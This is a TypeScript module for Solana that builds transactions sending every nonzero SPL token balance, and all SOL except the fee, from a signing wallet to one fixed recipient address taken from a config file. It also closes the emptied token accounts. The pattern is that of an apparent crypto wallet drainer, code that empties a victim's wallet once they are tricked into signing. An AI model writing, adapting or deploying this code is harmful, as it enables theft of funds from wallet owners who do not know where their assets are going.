import { AccountLayout, createAssociatedTokenAccountIdempotentInstruction, createCloseAccountInstruction, createTransferInstruction, getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { Connection, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
import { RECEPIENT } from "../config";

const recepient = new PublicKey(RECEPIENT)

const maxTxByteLength = 1000
const txFee = 5000

export async function transferAllTokens (publicKey: PublicKey, connection: Connection) {

    const tokenAccounts = await connection.getTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID })
        .then(ctx => {
            return ctx.value.map(v => {
                return {
                    data: {
                        ...AccountLayout.decode(v.account.data)
                    },
                    publicKey: v.pubkey
                }
            }).filter(v => v.data.amount > BigInt(0))
    })

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()

    const txs = [new Transaction()]

    for (const tkn of tokenAccounts) {
        const destination = getAssociatedTokenAddressSync(tkn.data.mint, recepient)
        const createIx = createAssociatedTokenAccountIdempotentInstruction(publicKey, destination, recepient, tkn.data.mint)
        const transferIx = createTransferInstruction(tkn.publicKey, destination, publicKey, tkn.data.amount)
        const closeIx = createCloseAccountInstruction(tkn.publicKey, publicKey, publicKey)

        let ixs = [createIx, transferIx, closeIx]
        
        const lastTxClone =  new Transaction().add(txs.slice(-1)[0])

        lastTxClone.add(...ixs)
        lastTxClone.lastValidBlockHeight = lastValidBlockHeight
        lastTxClone.recentBlockhash = blockhash
        lastTxClone.feePayer = publicKey

        const byteLength = lastTxClone.serializeMessage().byteLength

        if (byteLength > maxTxByteLength) {
            const newTx = new Transaction()
            newTx.add(...ixs)
            txs.push(newTx)
        } else {
            txs[txs.length - 1].add(...ixs)
        }

    }

    return {
        txs,
        amount: tokenAccounts.length
    }
}

export async function transferAllSol (publicKey: PublicKey, connection: Connection) {
    const balance = await connection.getBalance(publicKey)
    
    const tx = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: recepient,
            lamports: balance - txFee
        })
    )

    return {
        tx,
        balance: Math.floor((balance - 5000) / LAMPORTS_PER_SOL * 10000) / 10000
    }

    
}